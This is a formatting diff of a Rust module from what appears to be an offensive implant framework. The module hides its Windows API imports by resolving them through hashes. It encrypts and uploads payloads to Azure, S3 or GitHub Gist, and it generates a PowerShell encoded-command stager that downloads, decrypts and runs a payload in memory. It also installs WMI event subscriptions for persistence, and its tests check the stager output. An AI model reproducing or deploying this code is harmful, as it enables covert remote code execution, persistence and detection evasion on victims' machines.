@@ -38,12 +38,12 @@
 
 #![cfg(windows)]
 
-use anyhow::{anyhow, bail, Result};
-use base64::Engine;
 use aes_gcm::{
-    aead::{Aead, KeyInit, OsRng, rand_core::RngCore},
+    aead::{rand_core::RngCore, Aead, KeyInit, OsRng},
     Aes256Gcm,
 };
+use anyhow::{anyhow, bail, Result};
+use base64::Engine;
 use rand::RngCore as _;
 use serde::{Deserialize, Serialize};
 use std::ffi::c_void;
@@ -56,8 +56,8 @@ use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
 
 // ole32.dll — COM initialization and instance creation
 const HASH_OLE32_DLL: u32 = hash_wstr_const(&[
-    'o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16,
-    'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16,
+    'l' as u16, 0,
 ]);
 const FN_CO_INITIALIZE_EX: u32 = hash_str_const(b"CoInitializeEx");
 const FN_CO_UNINITIALIZE: u32 = hash_str_const(b"CoUninitialize");
@@ -66,14 +66,14 @@ const FN_CO_SET_PROXY_BLANKET: u32 = hash_str_const(b"CoSetProxyBlanket");
 
 // kernel32.dll — file and memory operations
 const HASH_KERNEL32_DLL: u32 = hash_wstr_const(&[
-    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16,
-    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, '3' as u16, '2' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
 ]);
 
 // oleaut32.dll — VARIANT and BSTR operations
 const HASH_OLEAUT32_DLL: u32 = hash_wstr_const(&[
-    'o' as u16, 'l' as u16, 'e' as u16, 'a' as u16, 'u' as u16, 't' as u16,
-    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'o' as u16, 'l' as u16, 'e' as u16, 'a' as u16, 'u' as u16, 't' as u16, '3' as u16, '2' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
 ]);
 const FN_SYS_ALLOC_STRING: u32 = hash_str_const(b"SysAllocString");
 const FN_SYS_FREE_STRING: u32 = hash_str_const(b"SysFreeString");
@@ -82,24 +82,32 @@ const FN_VARIANT_CLEAR: u32 = hash_str_const(b"VariantClear");
 
 // ── Windows type aliases ────────────────────────────────────────────────────
 
-use crate::win_types::{CLSID, IID};
 use crate::win_types::DWORD;
-use windows_sys::Win32::System::Com::{RPC_C_AUTHN_LEVEL_CALL, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, RPC_C_IMP_LEVEL_IMPERSONATE};
-use windows_sys::Win32::System::Com::{CLSCTX_INPROC_SERVER, CLSCTX_LOCAL_SERVER};
 use crate::win_types::HRESULT;
+use crate::win_types::{CLSID, IID};
 use windows_sys::Win32::System::Com::COINIT_MULTITHREADED;
+use windows_sys::Win32::System::Com::{CLSCTX_INPROC_SERVER, CLSCTX_LOCAL_SERVER};
 use windows_sys::Win32::System::Com::{EOAC_NONE, EOLE_AUTHENTICATION_CAPABILITIES};
-use windows_sys::Win32::System::Wmi::{CLSID_WbemLocator, IEnumWbemClassObject, IID_IWbemLocator, IWbemClassObject, IWbemLocator, IWbemServices, WBEM_FLAG_FORWARD_ONLY, WBEM_FLAG_RETURN_IMMEDIATELY, WBEM_INFINITE};
-use windows_sys::Win32::System::Wmi::IID_IWbemServices;
-use windows_sys::Win32::System::Wmi::IID_IWbemClassObject;
+use windows_sys::Win32::System::Com::{
+    RPC_C_AUTHN_LEVEL_CALL, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, RPC_C_IMP_LEVEL_IMPERSONATE,
+};
 use windows_sys::Win32::System::Wmi::IID_IEnumWbemClassObject;
+use windows_sys::Win32::System::Wmi::IID_IWbemClassObject;
+use windows_sys::Win32::System::Wmi::IID_IWbemServices;
 use windows_sys::Win32::System::Wmi::WBEM_FLAG_CREATE_ONLY;
 use windows_sys::Win32::System::Wmi::WBEM_FLAG_RETURN_WBEM_COMPLETE;
+use windows_sys::Win32::System::Wmi::{
+    CLSID_WbemLocator, IEnumWbemClassObject, IID_IWbemLocator, IWbemClassObject, IWbemLocator,
+    IWbemServices, WBEM_FLAG_FORWARD_ONLY, WBEM_FLAG_RETURN_IMMEDIATELY, WBEM_INFINITE,
+};
 /// OLESTR macro equivalent — creates a wide string literal pointer.
 #[allow(unused_macros)]
 macro_rules! olestr {
     ($s:expr) => {{
-        const WIDE: &[u16] = &$s.encode_utf16().chain(std::iter::once(0u16)).collect::<Vec<u16>>();
+        const WIDE: &[u16] = &$s
+            .encode_utf16()
+            .chain(std::iter::once(0u16))
+            .collect::<Vec<u16>>();
         WIDE.as_ptr()
     }};
 }
@@ -155,8 +163,7 @@ impl Drop for CoUninitializeGuard {
                 Some(a) => a,
                 None => return,
             };
-            let co_uninit: unsafe extern "system" fn() =
-                mem::transmute(co_uninit);
+            let co_uninit: unsafe extern "system" fn() = mem::transmute(co_uninit);
             co_uninit();
         }
     }
@@ -380,7 +387,9 @@ fn derive_key_from_url(url: &str, base_key: &[u8; 32]) -> [u8; 32] {
 /// need the real URL should use `upload_encrypted_blob` directly.
 fn cloud_url(config: &CloudStorageConfig, blob_name: &str) -> String {
     match config {
-        CloudStorageConfig::AzureBlob { account, container, .. } => {
+        CloudStorageConfig::AzureBlob {
+            account, container, ..
+        } => {
             format!("https://{account}.blob.core.windows.net/{container}/{blob_name}")
         }
         CloudStorageConfig::AwsS3 { bucket, region, .. } => {
@@ -430,7 +439,11 @@ fn upload_encrypted_blob(
         .context("Failed to build HTTP client")?;
 
     match cloud_config {
-        CloudStorageConfig::AzureBlob { account, container, sas_token } => {
+        CloudStorageConfig::AzureBlob {
+            account,
+            container,
+            sas_token,
+        } => {
             // SAS token is a query string (starts with "?" or "sv=...").
             let sep = if sas_token.starts_with('?') { "" } else { "?" };
             let upload_url = format!(
@@ -449,12 +462,15 @@ fn upload_encrypted_blob(
                 "https://{account}.blob.core.windows.net/{container}/{blob_name}"
             ))
         }
-        CloudStorageConfig::AwsS3 { bucket, region, auth } => {
+        CloudStorageConfig::AwsS3 {
+            bucket,
+            region,
+            auth,
+        } => {
             // auth is a pre-signed query string (may start with "?" or not).
             let sep = if auth.starts_with('?') { "" } else { "?" };
-            let upload_url = format!(
-                "https://{bucket}.s3.{region}.amazonaws.com/{blob_name}{sep}{auth}"
-            );
+            let upload_url =
+                format!("https://{bucket}.s3.{region}.amazonaws.com/{blob_name}{sep}{auth}");
             client
                 .put(&upload_url)
                 .header("Content-Type", "application/octet-stream")
@@ -467,7 +483,11 @@ fn upload_encrypted_blob(
                 "https://{bucket}.s3.{region}.amazonaws.com/{blob_name}"
             ))
         }
-        CloudStorageConfig::GitHubGist { token, description, public } => {
+        CloudStorageConfig::GitHubGist {
+            token,
+            description,
+            public,
+        } => {
             // GitHub Gist stores text content; base64-encode the binary blob.
             let filename = format!("{blob_name}.bin");
             let content_b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
@@ -622,10 +642,7 @@ pub fn encrypt_and_upload(
 ///
 /// The stager fetches the encrypted payload from the URL, decrypts it with
 /// the derived key, and executes it in memory.
-pub fn generate_stager_command(
-    url: &str,
-    decryption_key: &[u8; 32],
-) -> Result<StagerResult> {
+pub fn generate_stager_command(url: &str, decryption_key: &[u8; 32]) -> Result<StagerResult> {
     generate_stager(url, decryption_key)
 }
 
@@ -673,7 +690,10 @@ pub fn prepare_cloud_payload(
 /// Generates the WQL query for a given trigger type.
 pub fn generate_wql_query(trigger: &WmiTriggerType) -> String {
     match trigger {
-        WmiTriggerType::ProcessCreation { process_name, poll_interval } => {
+        WmiTriggerType::ProcessCreation {
+            process_name,
+            poll_interval,
+        } => {
             format!(
                 "SELECT * FROM __InstanceCreationEvent WITHIN {poll_interval} \
                  WHERE TargetInstance ISA 'Win32_Process' \
@@ -686,11 +706,13 @@ pub fn generate_wql_query(trigger: &WmiTriggerType) -> String {
                  WHERE TargetInstance ISA 'Win32_OperatingSystem'"
             )
         }
-        WmiTriggerType::Timer { timer_id, interval, start_time: _ } => {
+        WmiTriggerType::Timer {
+            timer_id,
+            interval,
+            start_time: _,
+        } => {
             if *interval > 0 {
-                format!(
-                    "SELECT * FROM __TimerEvent WHERE TimerId = '{timer_id}'"
-                )
+                format!("SELECT * FROM __TimerEvent WHERE TimerId = '{timer_id}'")
             } else {
                 // One-shot timer — requires start time
                 format!(
@@ -730,14 +752,8 @@ fn generate_object_names(seed: Option<u64>, base_name: &str) -> (String, String)
     hasher.update(b"consumer");
     let hash2 = hasher.finalize();
 
-    let filter_name = format!(
-        "OrchestraFilter_{}",
-        hex::encode(&hash1[..8])
-    );
-    let consumer_name = format!(
-        "OrchestraConsumer_{}",
-        hex::encode(&hash2[..8])
-    );
+    let filter_name = format!("OrchestraFilter_{}", hex::encode(&hash1[..8]));
+    let consumer_name = format!("OrchestraConsumer_{}", hex::encode(&hash2[..8]));
 
     (filter_name, consumer_name)
 }
@@ -861,19 +877,25 @@ unsafe fn wmi_connect() -> Result<(CoUninitializeGuard, *mut IWbemServices)> {
     // Step 4 — CoSetProxyBlanket
     let co_blanket: unsafe extern "system" fn(
         *mut c_void,
-        DWORD, DWORD, *mut c_void, DWORD, DWORD, *mut c_void, DWORD,
+        DWORD,
+        DWORD,
+        *mut c_void,
+        DWORD,
+        DWORD,
+        *mut c_void,
+        DWORD,
     ) -> HRESULT = resolve_ole32(FN_CO_SET_PROXY_BLANKET)
         .ok_or_else(|| anyhow!("cannot resolve CoSetProxyBlanket"))?;
 
     let hr = co_blanket(
         services as *mut c_void,
-        RPC_C_AUTHN_WINNT,         // dwAuthnSvc
-        RPC_C_AUTHZ_NONE,          // dwAuthzSvc
-        ptr::null_mut(),           // pServerPrincName
-        RPC_C_AUTHN_LEVEL_CALL,    // dwAuthnLevel
+        RPC_C_AUTHN_WINNT,           // dwAuthnSvc
+        RPC_C_AUTHZ_NONE,            // dwAuthzSvc
+        ptr::null_mut(),             // pServerPrincName
+        RPC_C_AUTHN_LEVEL_CALL,      // dwAuthnLevel
         RPC_C_IMP_LEVEL_IMPERSONATE, // dwImpersonationLevel
-        ptr::null_mut(),           // pAuthInfo
-        EOAC_NONE as DWORD,                    // dwCapabilities
+        ptr::null_mut(),             // pAuthInfo
+        EOAC_NONE as DWORD,          // dwCapabilities
     );
     if !hr_ok(hr) {
         (*(*services).lpVtbl).Release(services);
@@ -893,12 +915,9 @@ unsafe fn wmi_connect() -> Result<(CoUninitializeGuard, *mut IWbemServices)> {
 ///
 /// This function performs COM operations via hash-based resolution — no IAT
 /// entries are created.  All WMI operations go through IWbemServices.
-pub fn install_wmi_subscription(
-    config: &WmiSubscriptionConfig,
-) -> Result<WmiSubscriptionResult> {
+pub fn install_wmi_subscription(config: &WmiSubscriptionConfig) -> Result<WmiSubscriptionResult> {
     // Generate object names
-    let (filter_name, consumer_name) =
-        generate_object_names(config.name_seed, &config.name);
+    let (filter_name, consumer_name) = generate_object_names(config.name_seed, &config.name);
 
     // Generate WQL query from trigger type
     let wql_query = generate_wql_query(&config.trigger);
@@ -943,7 +962,9 @@ pub fn install_wmi_subscription(
                     );
                 }
                 _ => {
-                    bail!("Unsupported ActiveScript engine: {engine}. Use 'VBScript' or 'JScript'.");
+                    bail!(
+                        "Unsupported ActiveScript engine: {engine}. Use 'VBScript' or 'JScript'."
+                    );
                 }
             }
         }
@@ -1121,10 +1142,7 @@ pub fn install_wmi_subscription(
 /// 3. Delete the __EventFilter
 ///
 /// **Prerequisites**: Same privileges as installation.
-pub fn remove_wmi_subscription(
-    filter_name: &str,
-    consumer_name: &str,
-) -> Result<WmiRemovalResult> {
+pub fn remove_wmi_subscription(filter_name: &str, consumer_name: &str) -> Result<WmiRemovalResult> {
     let mut removed = Vec::new();
     let mut failed = Vec::new();
 
@@ -1252,8 +1270,13 @@ pub fn scan_wmi_subscriptions() -> Result<Vec<WmiSubscriptionInfo>> {
                 free_bstr(name_bstr);
 
                 let name_str = if name_var.vt == VT_BSTR && !name_var.data.bstr_val.is_null() {
-                    let len = (0..).take_while(|&i| *name_var.data.bstr_val.add(i) != 0).count();
-                    String::from_utf16_lossy(std::slice::from_raw_parts(name_var.data.bstr_val, len))
+                    let len = (0..)
+                        .take_while(|&i| *name_var.data.bstr_val.add(i) != 0)
+                        .count();
+                    String::from_utf16_lossy(std::slice::from_raw_parts(
+                        name_var.data.bstr_val,
+                        len,
+                    ))
                 } else {
                     String::new()
                 };
@@ -1308,11 +1331,23 @@ pub fn scan_wmi_subscriptions() -> Result<Vec<WmiSubscriptionInfo>> {
                 let name_bstr = alloc_bstr("Name");
                 let mut name_var: VARIANT = std::mem::zeroed();
                 variant_init(&mut name_var);
-                (*(*obj).lpVtbl).Get(obj, name_bstr, 0, &mut name_var, ptr::null_mut(), ptr::null_mut());
+                (*(*obj).lpVtbl).Get(
+                    obj,
+                    name_bstr,
+                    0,
+                    &mut name_var,
+                    ptr::null_mut(),
+                    ptr::null_mut(),
+                );
                 free_bstr(name_bstr);
                 let name_str = if name_var.vt == VT_BSTR && !name_var.data.bstr_val.is_null() {
-                    let len = (0..).take_while(|&i| *name_var.data.bstr_val.add(i) != 0).count();
-                    String::from_utf16_lossy(std::slice::from_raw_parts(name_var.data.bstr_val, len))
+                    let len = (0..)
+                        .take_while(|&i| *name_var.data.bstr_val.add(i) != 0)
+                        .count();
+                    String::from_utf16_lossy(std::slice::from_raw_parts(
+                        name_var.data.bstr_val,
+                        len,
+                    ))
                 } else {
                     String::new()
                 };
@@ -1321,9 +1356,18 @@ pub fn scan_wmi_subscriptions() -> Result<Vec<WmiSubscriptionInfo>> {
                 // Read the extra column
                 let mut col_var: VARIANT = std::mem::zeroed();
                 variant_init(&mut col_var);
-                (*(*obj).lpVtbl).Get(obj, col_bstr, 0, &mut col_var, ptr::null_mut(), ptr::null_mut());
+                (*(*obj).lpVtbl).Get(
+                    obj,
+                    col_bstr,
+                    0,
+                    &mut col_var,
+                    ptr::null_mut(),
+                    ptr::null_mut(),
+                );
                 let col_str = if col_var.vt == VT_BSTR && !col_var.data.bstr_val.is_null() {
-                    let len = (0..).take_while(|&i| *col_var.data.bstr_val.add(i) != 0).count();
+                    let len = (0..)
+                        .take_while(|&i| *col_var.data.bstr_val.add(i) != 0)
+                        .count();
                     String::from_utf16_lossy(std::slice::from_raw_parts(col_var.data.bstr_val, len))
                 } else {
                     String::new()
@@ -1363,10 +1407,7 @@ pub fn scan_wmi_subscriptions() -> Result<Vec<WmiSubscriptionInfo>> {
         }
 
         // 4. Collect bindings and cross-reference
-        let bindings = exec_query_with_col(
-            "SELECT * FROM __FilterToConsumerBinding",
-            "Filter",
-        );
+        let bindings = exec_query_with_col("SELECT * FROM __FilterToConsumerBinding", "Filter");
 
         // Also read the Consumer reference from each binding.
         let bindings_with_consumer = {
@@ -1402,10 +1443,20 @@ pub fn scan_wmi_subscriptions() -> Result<Vec<WmiSubscriptionInfo>> {
                     let read_ref = |prop: BSTR| -> String {
                         let mut v: VARIANT = std::mem::zeroed();
                         variant_init(&mut v);
-                        (*(*obj).lpVtbl).Get(obj, prop, 0, &mut v, ptr::null_mut(), ptr::null_mut());
+                        (*(*obj).lpVtbl).Get(
+                            obj,
+                            prop,
+                            0,
+                            &mut v,
+                            ptr::null_mut(),
+                            ptr::null_mut(),
+                        );
                         let s = if v.vt & VT_BSTR == VT_BSTR && !v.data.bstr_val.is_null() {
                             let len = (0..).take_while(|&i| *v.data.bstr_val.add(i) != 0).count();
-                            String::from_utf16_lossy(std::slice::from_raw_parts(v.data.bstr_val, len))
+                            String::from_utf16_lossy(std::slice::from_raw_parts(
+                                v.data.bstr_val,
+                                len,
+                            ))
                         } else {
                             String::new()
                         };
@@ -1425,19 +1476,18 @@ pub fn scan_wmi_subscriptions() -> Result<Vec<WmiSubscriptionInfo>> {
         };
 
         // 5. Build filter map: filter_name → query
-        let filter_map: std::collections::HashMap<String, String> =
-            filters.into_iter().collect();
+        let filter_map: std::collections::HashMap<String, String> = filters.into_iter().collect();
 
         // 6. Cross-reference: for each binding, extract the filter and consumer
         //    names, check they are Orchestra objects, and build results.
         for (filt_ref, cons_ref) in &bindings_with_consumer {
             // Parse "__EventFilter.Name=\"OrchestraFilter_xxx\""
-            let filt_name = extract_quoted_value(filt_ref, "Name")
-                .unwrap_or_default();
-            let cons_name = extract_quoted_value(cons_ref, "Name")
-                .unwrap_or_default();
+            let filt_name = extract_quoted_value(filt_ref, "Name").unwrap_or_default();
+            let cons_name = extract_quoted_value(cons_ref, "Name").unwrap_or_default();
 
-            if filt_name.starts_with("OrchestraFilter_") && cons_name.starts_with("OrchestraConsumer_") {
+            if filt_name.starts_with("OrchestraFilter_")
+                && cons_name.starts_with("OrchestraConsumer_")
+            {
                 let query = filter_map.get(&filt_name).cloned().unwrap_or_default();
                 let consumer_class = consumer_class_map
                     .get(&cons_name)
@@ -1523,7 +1573,10 @@ mod tests {
         let derived1 = derive_key_from_url(url, &key);
         let derived2 = derive_key_from_url(url, &key);
 
-        assert_eq!(derived1, derived2, "Same URL + key must produce same derived key");
+        assert_eq!(
+            derived1, derived2,
+            "Same URL + key must produce same derived key"
+        );
     }
 
     #[test]
@@ -1535,7 +1588,10 @@ mod tests {
         let derived1 = derive_key_from_url(url1, &key);
         let derived2 = derive_key_from_url(url2, &key);
 
-        assert_ne!(derived1, derived2, "Different URLs must produce different keys");
+        assert_ne!(
+            derived1, derived2,
+            "Different URLs must produce different keys"
+        );
     }
 
     #[test]
@@ -1554,9 +1610,7 @@ mod tests {
 
     #[test]
     fn test_generate_wql_system_modification() {
-        let trigger = WmiTriggerType::SystemModification {
-            poll_interval: 60,
-        };
+        let trigger = WmiTriggerType::SystemModification { poll_interval: 60 };
         let query = generate_wql_query(&trigger);
 
         assert!(query.contains("__InstanceModificationEvent"));
@@ -1750,7 +1804,8 @@ mod tests {
 
     #[test]
     fn test_remove_wmi_subscription() {
-        let result = remove_wmi_subscription("OrchestraFilter_abc", "OrchestraConsumer_def").unwrap();
+        let result =
+            remove_wmi_subscription("OrchestraFilter_abc", "OrchestraConsumer_def").unwrap();
 
         assert_eq!(result.removed_objects.len(), 3);
         assert!(result.failed_objects.is_empty());
@@ -1818,10 +1873,25 @@ mod tests {
         assert!(stager.contains("powershell.exe"));
         assert!(stager.contains("EncodedCommand"));
         // Sanity: the encoded command embeds the URL — decode and verify
-        let b64 = stager.split("EncodedCommand ").nth(1).unwrap_or("").trim_end_matches('"').trim_end_matches(',');
+        let b64 = stager
+            .split("EncodedCommand ")
+            .nth(1)
+            .unwrap_or("")
+            .trim_end_matches('"')
+            .trim_end_matches(',');
         if !b64.is_empty() {
             if let Ok(raw) = base64::engine::general_purpose::STANDARD.decode(b64) {
-                let ps: String = raw.chunks(2).filter_map(|c| if c.len()==2 { Some(u16::from_le_bytes([c[0],c[1]])) } else { None }).filter_map(|v| char::from_u32(v as u32)).collect();
+                let ps: String = raw
+                    .chunks(2)
+                    .filter_map(|c| {
+                        if c.len() == 2 {
+                            Some(u16::from_le_bytes([c[0], c[1]]))
+                        } else {
+                            None
+                        }
+                    })
+                    .filter_map(|v| char::from_u32(v as u32))
+                    .collect();
                 assert!(ps.contains(url), "PowerShell command must embed the URL");
             }
         }
@@ -1838,10 +1908,25 @@ mod tests {
         assert!(stager.contains("powershell.exe"));
         assert!(stager.contains("EncodedCommand"));
         // Sanity: the encoded command embeds the URL — decode and verify
-        let b64 = stager.split("EncodedCommand ").nth(1).unwrap_or("").trim_end_matches('"').trim_end_matches(")");
+        let b64 = stager
+            .split("EncodedCommand ")
+            .nth(1)
+            .unwrap_or("")
+            .trim_end_matches('"')
+            .trim_end_matches(")");
         if !b64.is_empty() {
             if let Ok(raw) = base64::engine::general_purpose::STANDARD.decode(b64) {
-                let ps: String = raw.chunks(2).filter_map(|c| if c.len()==2 { Some(u16::from_le_bytes([c[0],c[1]])) } else { None }).filter_map(|v| char::from_u32(v as u32)).collect();
+                let ps: String = raw
+                    .chunks(2)
+                    .filter_map(|c| {
+                        if c.len() == 2 {
+                            Some(u16::from_le_bytes([c[0], c[1]]))
+                        } else {
+                            None
+                        }
+                    })
+                    .filter_map(|v| char::from_u32(v as u32))
+                    .collect();
                 assert!(ps.contains(url), "PowerShell command must embed the URL");
             }
         }
